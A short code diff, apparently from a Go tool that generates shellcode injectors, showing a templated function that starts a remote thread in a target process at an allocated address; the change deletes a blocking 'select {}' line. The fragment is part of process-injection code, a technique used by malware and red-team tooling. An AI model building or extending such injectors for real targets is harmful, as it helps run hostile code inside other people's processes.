@@ -98,7 +98,6 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 
     /* load remote thread */
     _, _, _ = CreateRemoteThread.Call(uintptr(process.Process), 0, 0, baseAddr, 0, 0, 0)
-    select {}
 }
     `, targetProcess)
 }
